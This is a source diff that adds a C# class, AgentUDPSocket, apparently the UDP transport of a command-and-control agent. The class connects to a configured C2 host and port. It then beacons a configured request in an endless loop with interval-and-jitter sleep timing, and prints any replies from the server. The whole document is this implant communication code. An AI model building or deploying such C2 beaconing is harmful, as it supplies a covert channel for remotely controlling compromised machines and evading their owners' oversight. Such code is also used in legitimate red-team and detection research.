@@ -1,0 +1,128 @@
+public class AgentUDPSocket
+    {
+        public UdpClient uClient { get; set; }
+        public IPEndPoint endpoint { get; set; }
+        public Configuration configuration;
+
+        public AgentUDPSocket(dynamic configuration)
+        {
+            this.configuration = configuration;
+        }
+
+        public string GetURI()
+        {
+            return configuration.C2URI;
+        }
+
+
+
+        public void Start()
+        {
+
+            String ServerAddress = configuration.HOST;
+            Int32 Port = Int32.Parse(configuration.PORT);
+
+            Console.WriteLine("Connecting to {0}", configuration.C2URI);
+
+
+            try
+            {
+                // connect to the UDP socket in configuration
+                Console.WriteLine("Linking to the C2 via {0}", configuration.C2URI);
+                uClient = new UdpClient();
+                endpoint = new IPEndPoint(IPAddress.Parse(ServerAddress), Port);
+                uClient.Connect(endpoint);
+                Console.WriteLine("The UDP connection is successfully established.");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("UDP service/socket is not available");
+                Console.WriteLine(e);
+                return;
+            }
+            Thread SocketThread = new Thread(() => { StartAsync().Wait(); });
+
+            SocketThread.Start();
+
+            // sleep calculation
+            Int32 i = Int32.Parse(configuration.INTERVAL);
+            Int32 j = Int32.Parse(configuration.JITTER);
+            Int32 SleepTimer = (i - i * j / 100) * 1000;
+
+            while (true)
+            {
+                SendAsync(configuration.REQUEST).Wait();
+                Thread.Sleep(SleepTimer);
+            }
+
+        }
+
+        public bool Send(string data = "")
+        {
+            if (data == "") return false;
+            SendAsync(data).Wait();
+            return true;
+        }
+
+        public async Task StartAsync()
+        {
+            await Task.WhenAll(ReceiveAsync(), SendAsync());
+        }
+
+        public async Task SendAsync(string data = "")
+        {
+            if (data == "") return;
+
+            try
+            {
+                byte[] buffer = Encoding.UTF8.GetBytes(data);
+                // send the data with buffer header
+                await uClient.SendAsync(buffer, buffer.Length);
+            }
+            catch (Exception e)
+            {
+                Console.Error.WriteLine("Socket is unreachable. {0}", e);
+            }
+        }
+
+        public void Receive()
+        {
+            ReceiveAsync().Wait();
+        }
+
+        public async Task ReceiveAsync()
+        {
+            try
+            {
+                Console.WriteLine("Receive loop starting...");
+                while (true)
+                {
+                    if (uClient.Available > 0)
+                    {
+                        UdpReceiveResult result = await uClient.ReceiveAsync();
+                        byte[] rbuffer = result.Buffer;
+                        string response = Regex.Replace((string)Encoding.UTF8.GetString(rbuffer), "\0", string.Empty);
+                        Console.WriteLine("{0}", response);
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+                Console.Error.WriteLine("The service stopped responding: {0}", e);
+                Stop();
+            }
+        }
+
+        public void Stop()
+        {
+            Console.Error.WriteLine("The UDP socket is closing.");
+            try
+            {
+                uClient.Close();
+            }
+            catch (Exception e)
+            {
+                Console.Error.WriteLine("Failed to close the socket. {0}", e);
+            }
+        }
+    }
